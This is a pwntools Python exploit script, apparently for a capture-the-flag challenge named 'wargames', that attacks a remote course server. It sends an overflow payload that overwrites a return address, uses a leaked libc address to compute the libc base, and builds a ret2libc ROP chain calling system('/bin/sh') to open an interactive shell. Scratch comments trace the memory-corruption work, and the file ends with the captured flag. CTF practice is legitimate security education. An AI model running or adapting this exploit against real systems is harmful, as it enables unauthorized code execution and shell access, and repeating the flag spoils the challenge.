from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
libc = ELF('libc.so.6')          # Load appropriate library: Glibc 2.35
rop = ROP(libc)                     # Find appropriate gadgets

# p64(pop_rdi) + p64(binsh) + p64(ret_pad) + p64(sys) + p64(exit_addr)

def print_decimal_values(hex_val):
    # Convert the hexadecimal value to a decimal value.
    dec_val = hex_val

    decimal1 = dec_val >> 32
    decimal2 = dec_val & 0xFFFFFFFF

    # Print the decimal values.
    print(decimal2, decimal1)



#define LOG_SIZE 9
#define CODE_SIZE 12 

p = remote('cs4401shell2.walls.ninja', 31374)
# FIRST ENV 372 hex 882 
# p = gdb.debug('./wargames', gdbscript='''
#      break main
#      b *main+150
#      b *play
#      continue
#       ''')
# p = process(['./wargames'])

# PTR to DEBUGJOSHUA in TEXT
# 0x00000000401535
# ACTUAL POINTER
# 0x0000000040161e -> TODO: Remove DEBUGJOSHUA=1
# 0x0000000040162B *****ex
# cat flag.txt 0x0000000000401649
log.info(p.recvuntil(b']'))
payload = b'YYYzero'
# Offset is 325 Local. 
# OFfset for server is? 277 for two, 276 for zero
payload += flat({276: p64(0x0000000040162B)})
# server libc 0x7f166d792c87
# server libc 0x7f36e9f2cc87
# server libc 0x7f0840879c87
# payload += flat({200: b'x'})
# payload += cyclic(5600)
p.sendline(payload)
log.info(p.recvuntil(b']' ))
log.info(p.recvuntil(b']' ))
log.info(p.recvuntil(b'?'))

log.info(p.recvline())
preLeak = p.recvlineS()
log.info(preLeak)

# p.sendline((b'2147483647') *200)

#AM I OVERWRITING I?

# lets try 28 i 
# 19 big numbers
# 0x7efc218b8ed0n

# can we write to memory behind us? 
# lets try writing a -negative number and seeing if i can write something?
# lets try check_win
# Lets write to something there
# Lets find its saved rip
# Search in memory for it relative to our stack in play
# 0x007f499b503df8 is where its return address is 
# 0x007f499b503e00 
# its right behind our move_log
# Our plan seems to work
# by overwriting i to a negative value
# we can go to seemingly any place in memory
#  Lets do a bit more testing 
# 



leak = preLeak[-13:]
_libc_start_main_128 = int(leak, 16)
log.info("LEAKED LIBC ADDR: "+ hex(_libc_start_main_128))


_libc_start_main_offset = libc.symbols["__libc_start_main"]  # Offset from libc base
# _libc_start_main_offset = libc.symbols["__libc_start_call_main"]
_libc_start_main = _libc_start_main_128-231 #-128 for local                 # Get __libc_start_main, has to be 231 on server
_libc_start_main = _libc_start_main # for local +  0xb0
_libc_base = _libc_start_main-_libc_start_main_offset        # Calculate libc base value
# Feedback
log.info("_libc_start_main_128: " + hex(_libc_start_main_128))
log.info("_libc_start_main: " + hex(_libc_start_main))
log.info("_libc_base: " + hex(_libc_base))
print("\n")
sys = _libc_base + libc.symbols["system"]                     # Get system
exit_addr = _libc_base + libc.symbols["exit"]                 # Get exit
binsh = _libc_base + next(libc.search(b"/bin/sh"))             # Get "/bin/sh"
log.info("System Address: " + hex(sys))
log.info("Exit Address: " + hex(exit_addr))
log.info("/bin/sh Address: " + hex(binsh))
print("\n")
pop_rdi_offset = (rop.find_gadget(['pop rdi', 'ret']))[0]      # Get pop rdi offset
ret_pad_offset = (rop.find_gadget(['ret']))[0]                 # Get extra ret. offset for MOVAPS

pop_rdi = _libc_base + pop_rdi_offset                          # Get pop rdi address
ret_pad = _libc_base + ret_pad_offset
# Feedback
log.info("pop offset: " + hex(pop_rdi_offset))
log.info("ret offset: " + hex(ret_pad_offset))
log.info("pop rdi: " + hex(pop_rdi))
log.info("ret: " + hex(ret_pad))
print("\n") 

log.info("Final addresses order\n")
log.info("/bin/sh Address: " + hex(0x0000000000401649))
log.info("ret: " + hex(ret_pad))
log.info("System Address: " + hex(sys))
log.info("Exit Address: " + hex(exit_addr))
log.info("pop rdi: " + hex(pop_rdi))

gadget1 = _libc_base + 0x4f2a5
gadget2 = _libc_base + 0x4f302
gadget3 = _libc_base + 0x10a2fc


print_decimal_values(0x0000000000401649)
print_decimal_values(ret_pad)
print_decimal_values(sys)
print_decimal_values(exit_addr)
print_decimal_values(0xffffffffffffffff)
print_decimal_values(0xffffffffffffffff)
print_decimal_values(0xffffffffffffffff)
print_decimal_values(0xffffffffffffffff)
print_decimal_values(0xffffffffffffffff)
print(2147483647, -2 )
print_decimal_values(pop_rdi)
#print_decimal_values(gadget3)


p.interactive()

#Addr where ret is stored 0x6020e0

#overwrite of main ret address is 36 + YYYzero
# LESSOPEN=| /usr/bin/lesspipe %s


#Main exits with code 0 

#Launch returns null, but might be able to overwrite its ret addr

#If we are overwriting to the point where we fuck up the getenv
#Maybe we can overwrite into the __environ array

# Addr of num_platers: 0x7fffffffe4d0(0x00007fffffffe7f9)
# Addr of ans: 0x7fffffffe4cf
# Addr of id_play 0x7fffffffe4c0
# Addr of id_launch: 0x7fffffffe4b8
# Addr of result: 0x7fffffffe4ec

#IT IS IMPOSSIBLE TO OVERWRITE ID_play
# and ID_launch
# we must overwrite the environ array to add in debugjoshua
#main +460
# at 389 we begin to mess up the environ array pointer thing?
# which is weird because at 325 is where it pulls the first environ from our fake __envrion?

#First env location in gdb 
# 0x7fffffffe842
# offset 882
#its lessopen


#on normal run, rhx has address to address of start of env
# r12 has the raw address of start of env
# taken reason !z


# r12 is a pointer toward the environment variable. ni
# getenv+178 SHOULD BE NOT TAKEN REASON !!Z


# Test : 0x007f3beb894d90

# Main stack 0x007ffc596d2ef0
# 0x7ffc596b4000

#launch stack 0x007f12204b5e30


# # Convert the 8-byte hexadecimal value to a decimal integer
# decimal_value = int(8_byte_hex, 16)

# # Split the decimal integer into two 4-byte values
# decimal1 = decimal_value >> 32
# decimal2 = decimal_value & 0xFFFFFFFF

# # Convert the two 4-byte decimal values to hexadecimal
# hex1 = hex(decimal1)
# hex2 = hex(decimal2)

# # Concatenate the two hexadecimal values to form the original 8-byte hexadecimal value
# concatenated_hex = hex1 + hex2


#Flag 27ae2e59bfcdb07b70f9437a3320e545
